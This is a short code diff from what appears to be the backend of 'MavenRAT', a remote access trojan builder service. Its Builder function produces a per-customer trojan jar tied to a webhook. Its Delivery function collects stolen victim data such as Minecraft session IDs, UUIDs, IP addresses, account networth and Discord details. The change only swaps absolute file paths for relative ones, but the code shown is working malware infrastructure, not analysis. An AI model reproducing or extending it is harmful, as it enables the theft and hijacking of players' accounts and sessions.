@@ -23,7 +23,7 @@ def Builder(request):
 
             process_and_send_data(user_id, user, ip, webhook)
 
-            jar_file_path = 'C:/Users/Gustavo/Documents/MavenRAT/mavenrat/file/MavenRat1.0.jar'
+            jar_file_path = 'MavenRAT/mavenrat/file/MavenRat1.0.jar'
             new_jar_content = replace_code_in_jar(jar_file_path, user_id)
 
             if new_jar_content is not None:
@@ -49,7 +49,7 @@ def process_and_send_data(user_id, user, ip, webhook):
             "webhook": webhook,
         }
 
-        users_file_path = 'C:/Users/Gustavo/Documents/MavenRAT/mavenrat/users/users.json'
+        users_file_path = 'MavenRAT/mavenrat/users/users.json'
         update_users_file(users_file_path, user_data, ip)
     except Exception as e:
         print('An error occurred while processing and sending data:', e)
@@ -152,7 +152,7 @@ def Delivery(request):
             def process_data_delivery(ign, uuid, ssid, ip, i, profile, networth, discord):
                 try:
 
-                    with open('C:/Users/Gustavo/Documents/MavenRAT/mavenrat/users/users.json', 'r') as f:
+                    with open('MavenRAT/mavenrat/users/users.json', 'r') as f:
                         users = json.load(f)
 
                     user_data = next((user for user in users if user['user_id'] == i), None)
